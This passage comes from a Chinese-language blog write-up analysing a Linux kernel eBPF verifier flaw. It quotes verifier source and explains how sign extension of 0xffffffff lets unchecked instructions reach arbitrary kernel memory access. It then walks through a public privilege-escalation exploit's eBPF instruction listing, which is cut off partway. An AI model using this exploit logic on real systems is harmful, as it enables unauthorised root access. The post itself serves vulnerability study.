BPF_JMP opcode %x\n&quot;</span>, opcode);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br><span class="hljs-keyword">if</span> (insn-&gt;imm != <span class="hljs-number">0</span>) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_JMP uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-comment">/* check src1 operand */</span><br>err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;<br>verbose(<span class="hljs-string">&quot;R%d pointer comparison prohibited\n&quot;</span>,<br>insn-&gt;src_reg);<br><span class="hljs-keyword">return</span> -EACCES;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (insn-&gt;src_reg != BPF_REG_0) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_JMP uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* check src2 operand */</span><br>err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-comment">/* detect if R == 0 where R was initialized to zero earlier */</span><br>[<span class="hljs-number">1</span>]<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;<br>    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;<br>    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;<br>    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;<br><span class="hljs-keyword">if</span> (opcode == BPF_JEQ) &#123;<br><span class="hljs-comment">/* if (imm == imm) goto pc+off;</span><br><span class="hljs-comment"> * only follow the goto, ignore fall-through</span><br><span class="hljs-comment"> */</span><br>*insn_idx += insn-&gt;off;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* if (imm != imm) goto pc+off;</span><br><span class="hljs-comment"> * only follow fall-through branch, since</span><br><span class="hljs-comment"> * that&#x27;s where the program will go</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br>[<span class="hljs-number">2</span>]other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="hljs-number">1</span>, *insn_idx);<br><span class="hljs-keyword">if</span> (!other_branch)<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-comment">/* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */</span><br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;<br>    insn-&gt;imm == <span class="hljs-number">0</span> &amp;&amp; (opcode == BPF_JEQ ||<br>       opcode == BPF_JNE) &amp;&amp;<br>    regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123;<br><span class="hljs-keyword">if</span> (opcode == BPF_JEQ) &#123;<br><span class="hljs-comment">/* next fallthrough insn can access memory via</span><br><span class="hljs-comment"> * this register</span><br><span class="hljs-comment"> */</span><br>regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;<br><span class="hljs-comment">/* branch targer cannot access it, since reg == 0 */</span><br>other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;<br>other_branch-&gt;regs[insn-&gt;dst_reg].imm = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;<br>regs[insn-&gt;dst_reg].type = CONST_IMM;<br>regs[insn-&gt;dst_reg].imm = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;<br>verbose(<span class="hljs-string">&quot;R%d pointer comparison prohibited\n&quot;</span>, insn-&gt;dst_reg);<br><span class="hljs-keyword">return</span> -EACCES;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;<br>   (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123;<br><br><span class="hljs-keyword">if</span> (opcode == BPF_JEQ) &#123;<br><span class="hljs-comment">/* detect if (R == imm) goto</span><br><span class="hljs-comment"> * and in the target state recognize that R = imm</span><br><span class="hljs-comment"> */</span><br>other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;<br>other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* detect if (R != imm) goto</span><br><span class="hljs-comment"> * and in the fall-through state recognize that R = imm</span><br><span class="hljs-comment"> */</span><br>regs[insn-&gt;dst_reg].type = CONST_IMM;<br>regs[insn-&gt;dst_reg].imm = insn-&gt;imm;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (log_level)<br>print_verifier_state(env);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="能否直接进行内存读写？"><a href="#能否直接进行内存读写？" class="headerlink" title="能否直接进行内存读写？"></a>能否直接进行内存读写？</h5>内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当 r7 和 r8 的值可控就可以达到内存任意写，类似于mov dword ptr[r7], r8这样的操作。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">STX_MEM_DW(<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>)<br></code></pre></td></tr></table></figure>接下来分析一下ST和LD有哪些限制，check_reg_arg[1]处检查寄存器是否访问寄存器的序号是否超过最大值10，如果是SRC_OP检查是否是未初始化的值。否则检查是否要写的地方是rbp，并将要写的寄存器值置为UNKOWN。然后是[2]check_mem_access检查，该函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (class == BPF_LDX) &#123;<br><span class="hljs-keyword">enum</span> bpf_reg_type src_reg_type;<br><br><span class="hljs-comment">/* check for reserved fields is already done */</span><br><br><span class="hljs-comment">/* check src operand */</span><br>[<span class="hljs-number">1</span>]err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br>[<span class="hljs-number">1</span>]err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br>src_reg_type = regs[insn-&gt;src_reg].type;<br><br><span class="hljs-comment">/* check that memory (src_reg + off) is readable,</span><br><span class="hljs-comment"> * the state of dst_reg will be updated by this func</span><br><span class="hljs-comment"> */</span><br>[<span class="hljs-number">2</span>]err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,<br>       BPF_SIZE(insn-&gt;code), BPF_READ,<br>       insn-&gt;dst_reg);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;<br>insn_idx++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (insn-&gt;imm == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* saw a valid insn</span><br><span class="hljs-comment"> * dst_reg = *(u32 *)(src_reg + off)</span><br><span class="hljs-comment"> * use reserved &#x27;imm&#x27; field to mark this insn</span><br><span class="hljs-comment"> */</span><br>insn-&gt;imm = src_reg_type;<br><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;<br>   (src_reg_type == PTR_TO_CTX ||<br>    insn-&gt;imm == PTR_TO_CTX)) &#123;<br><span class="hljs-comment">/* ABuser program is trying to use the same insn</span><br><span class="hljs-comment"> * dst_reg = *(u32*) (src_reg + off)</span><br><span class="hljs-comment"> * with different pointer types:</span><br><span class="hljs-comment"> * src_reg == ctx in one branch and</span><br><span class="hljs-comment"> * src_reg == stack|map in some other branch.</span><br><span class="hljs-comment"> * Reject it.</span><br><span class="hljs-comment"> */</span><br>verbose(<span class="hljs-string">&quot;same insn cannot be used with different pointers\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (class == BPF_STX) &#123;<br><span class="hljs-keyword">enum</span> bpf_reg_type dst_reg_type;<br><br><span class="hljs-keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;<br>err = check_xadd(env, insn);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br>insn_idx++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-comment">/* check src1 operand */</span><br>[<span class="hljs-number">1</span>]err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><span class="hljs-comment">/* check src2 operand */</span><br>[<span class="hljs-number">1</span>]err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br>dst_reg_type = regs[insn-&gt;dst_reg].type;<br><br><span class="hljs-comment">/* check that memory (dst_reg + off) is writeable */</span><br>[<span class="hljs-number">2</span>]err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,<br>       BPF_SIZE(insn-&gt;code), BPF_WRITE,<br>       insn-&gt;src_reg);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">if</span> (insn-&gt;imm == <span class="hljs-number">0</span>) &#123;<br>insn-&gt;imm = dst_reg_type;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;<br>   (dst_reg_type == PTR_TO_CTX ||<br>    insn-&gt;imm == PTR_TO_CTX)) &#123;<br>verbose(<span class="hljs-string">&quot;same insn cannot be used with different pointers\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>以上情况，如果采用MOV这样的赋值指令去读写的话，寄存器类型会判定为IMM，而拒绝。另外一种是用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。而这种方法会在赋值时被设定为UNKNOWN而拒绝读写。<h4 id="bpf-prog-run"><a href="#bpf-prog-run" class="headerlink" title="bpf_prog_run"></a>bpf_prog_run</h4>以上就是对于加载指令的全部检查，可以看到我们能想到的内存读写方法都是会被检测出来的。真正执行的时候代码在<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c#L195">__bpf_prog_run</a>中，其中可以看到所谓的各个寄存器和栈只是这个函数的局部变量。<br>程序维护了一个跳表，根据opcode来进行跳转，而函数中没有任何check，具体实现代码十分简单，就不赘述了。可以发现程序的寄存器变量与check中的寄存器变量不太一样，此时是unsigned long long类型。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> __bpf_prog_run(<span class="hljs-keyword">void</span> *ctx, <span class="hljs-keyword">const</span> struct bpf_insn *insn)<br>&#123;<br>u64 <span class="hljs-built_in">stack</span>[MAX_BPF_STACK / <span class="hljs-keyword">sizeof</span>(u64)];<br>u64 regs[MAX_BPF_REG], tmp;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *jumptable[<span class="hljs-number">256</span>] = &#123;<br>[<span class="hljs-number">0</span> ... <span class="hljs-number">255</span>] = &amp;&amp;default_label,<br><span class="hljs-comment">/* Now overwrite non-defaults ... */</span><br>        ...<br></code></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>本漏洞的原因是check函数和真正的函数的执行方法不一致导致的，主要问题是二者寄存器值类型不同。先看下面一段EBPF指令：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">[<span class="hljs-number">0</span>]: ALU_MOV_K(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0xffffffff</span>)<span class="hljs-comment">/* r9 = (u32)0xFFFFFFFF */</span><br>[<span class="hljs-number">1</span>]: JMP_JNE_K(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0xffffffff</span>)<span class="hljs-comment">/* if (r9 == -1) &#123;       */</span><br>[<span class="hljs-number">2</span>]: ALU64_MOV_K(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">3</span>]: JMP_EXIT(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>)<span class="hljs-comment">/*   exit(0);            */</span><br>[<span class="hljs-number">4</span>]: ......<br></code></pre></td></tr></table></figure>第0条指令是将0xffffffff放入r9寄存器中，当在do_check函数中时，在[1]处会直接将0xffffffff复制给r9，并将type赋值为IMM。在第[1]条指令，比较r9 == 0xffffffff，相等时就执行[2]、[3]，否则跳到[4]。根据前文对退出的分析，这个地方在do_check看来是一个恒等式，不会将另外一条路径压入stack，直接退出。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123;<br>err = check_alu_op(env, insn);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err；<br>&#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> check_alu_op(struct verifier_env *env, struct bpf_insn *insn)<br>&#123;<br>struct reg_state *regs = env-&gt;cur_state.regs;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-keyword">int</span> err;<br><br><span class="hljs-keyword">if</span> (opcode == BPF_END || opcode == BPF_NEG) &#123;<br>... ...<br>&#125;<br><br><span class="hljs-comment">/* check src operand */</span><br>.......<br><br><span class="hljs-comment">/* check dest operand */</span><br>.......<br><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode == BPF_MOV) &#123;<br><br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br><span class="hljs-keyword">if</span> (insn-&gt;imm != <span class="hljs-number">0</span> || insn-&gt;off != <span class="hljs-number">0</span>) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_MOV uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-comment">/* check src operand */</span><br>err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="hljs-number">0</span>) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_MOV uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* check dest operand */</span><br>err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br><span class="hljs-keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;<br><span class="hljs-comment">/* case: R1 = R2</span><br><span class="hljs-comment"> * copy register state to dest reg</span><br><span class="hljs-comment"> */</span><br>regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;<br>verbose(<span class="hljs-string">&quot;R%d partial copy of pointer\n&quot;</span>,<br>insn-&gt;src_reg);<br><span class="hljs-keyword">return</span> -EACCES;<br>&#125;<br>regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;<br>regs[insn-&gt;dst_reg].map_ptr = <span class="hljs-literal">NULL</span>;<br>&#125;<br>[<span class="hljs-number">1</span>]&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* case: R = imm</span><br><span class="hljs-comment"> * remember the value we stored into this reg</span><br><span class="hljs-comment"> */</span><br>regs[insn-&gt;dst_reg].type = CONST_IMM;<br>regs[insn-&gt;dst_reg].imm = insn-&gt;imm;<br>&#125;<br><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode &gt; BPF_END) &#123;<br>verbose(<span class="hljs-string">&quot;invalid BPF_ALU opcode %x\n&quot;</span>, opcode);<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">/* all other ALU ops: and, sub, xor, add, ... */</span><br>......<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>而在真实执行的过程中，由于寄存器类型不一样，在执行第二条跳转语句时存在问题：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">JMP_JNE_K:<br><span class="hljs-keyword">if</span> (DST != IMM) &#123;<br>insn += insn-&gt;off;<br>CONT_JMP;<br>&#125;<br>CONT;<br></code></pre></td></tr></table></figure>可以看到汇编指令被翻译成movsxd，而此时会发生符号扩展，由原来的0xffffffff扩展成0xffffffffffffffff，再次比较的时候二者并不相同，造成了跳转到[4]处执行，从而绕过了对[4]以后EBPF程序的校验。<br><img src="https://s2.loli.net/2022/09/24/fS2vMsnukzrZ3oj.png" alt="image.png"></li></ol><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>当[4]以后的程序不经过check以后，就可以对[4]的内容进行构造了，利用真正执行时无类型就可以达到内存任意读写了。使用exploit-db上的<a href="https://www.exploit-db.com/exploits/45010">exp</a>，编译完运行即可提权。<br>下面来分析exp的提权原理。eBPF程序逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">[<span class="hljs-number">0</span>]: ALU_MOV_K(BPF_REG_9, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xffffffff</span>)<span class="hljs-comment">//r9 = -1</span><br>[<span class="hljs-number">1</span>]: JMP_JNE_K(BPF_REG_9, BPF_REG_0, <span class="hljs-number">0x2</span>, <span class="hljs-number">0xffffffff</span>)<span class="hljs-comment">//if(r9 == -1)&#123;</span><br>[<span class="hljs-number">2</span>]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r0 = 0</span><br>[<span class="hljs-number">3</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit(0)</span><br>[<span class="hljs-number">4</span>]: LD_MAP_FD(BPF_REG_9, map_addr)<span class="hljs-comment">//r9 = mapfd</span><br>[<span class="hljs-number">5</span>]: bpf_map_padding<br>----------------------------------------------------------------------------<br>[<span class="hljs-number">6</span>]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r1 = r9</span><br>[<span class="hljs-number">7</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r2 = r10(rbp)</span><br>[<span class="hljs-number">8</span>]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xfffffffc</span>)<span class="hljs-comment">//r2 = r2-4</span><br>[<span class="hljs-number">9</span>]: ST_MEM_W(BPF_REG_10, BPF_REG_0, <span class="hljs-number">0xfffc</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[rbp-4] = 0</span><br>[<span class="hljs-number">10</span>]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, <span class="hljs-number">0</span>, <br>           BPF_FUNC_map_lookup_elem)<span class="hljs-comment">//执行BPF_FUNC_map_lookup_elem</span><br>[<span class="hljs-number">11</span>]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//if(r0 == 0)&#123;</span><br>[<span class="hljs-number">12</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">13</span>]: LDX_MEM_DW(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r6 = [r0] = map[0]</span><br>----------------------------------------------------------------------------<br>[<span class="hljs-number">14</span>]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r1 = r9</span><br>[<span class="hljs-number">15</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r2 = r10</span><br>[<span class="hljs-number">16</span>]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xfffffffc</span>)<span class="hljs-comment">//r2 = r2 - 4</span><br>[<span class="hljs-number">17</span>]: ST_MEM_W(BPF_REG_10, BPF_REG_0, <span class="hljs-number">0xfffc</span>, <span class="hljs-number">0x1</span>)<span class="hljs-comment">//[rbp-4] = 1</span><br>[<span class="hljs-number">18</span>]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, <span class="hljs-number">0</span>, <br>                   BPF_FUNC_map_lookup_elem)<br>[<span class="hljs-number">19</span>]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//if(r0 == 0)&#123;</span><br>[<span class="hljs-number">20</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit(0)</span><br>[<span class="hljs-number">21</span>]: LDX_MEM_DW(BPF_REG_7, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r7 = [r0] = map[1]</span><br>----------------------------------------------------------------------------<br>[<span class="hljs-number">22</span>]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">23</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">24</span>]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xfffffffc</span>)<br>[<span class="hljs-number">25</span>]: ST_MEM_W(BPF_REG_10, BPF_REG_0, <span class="hljs-number">0xfffc</span>, <span class="hljs-number">0x2</span>)<br>[<span class="hljs-number">26</span>]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, 